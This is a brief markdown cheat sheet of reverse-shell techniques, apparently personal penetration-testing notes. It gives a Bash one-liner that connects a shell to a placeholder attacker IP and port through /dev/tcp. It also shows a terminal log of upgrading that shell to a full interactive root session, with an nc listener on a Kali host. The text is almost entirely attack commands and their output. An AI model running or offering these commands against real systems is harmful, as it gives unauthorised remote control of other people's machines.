# Reverse Shells

## One-Liners

### Bash
Easy Bash
```
bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
```
Shell Upgrade
```
root@target:/backend# script /dev/null -c bash
script /dev/null -c bash            
Script started, file is /dev/null
root@target:/backend# ^Z                 
[1]+  Stopped                 nc -lnvp 1337
chuxtr@kali$ stty raw -echo; fg
nc -lnvp 1337
            reset
reset: unknown terminal type unknown
Terminal type? screen
root@target:/backend#
```
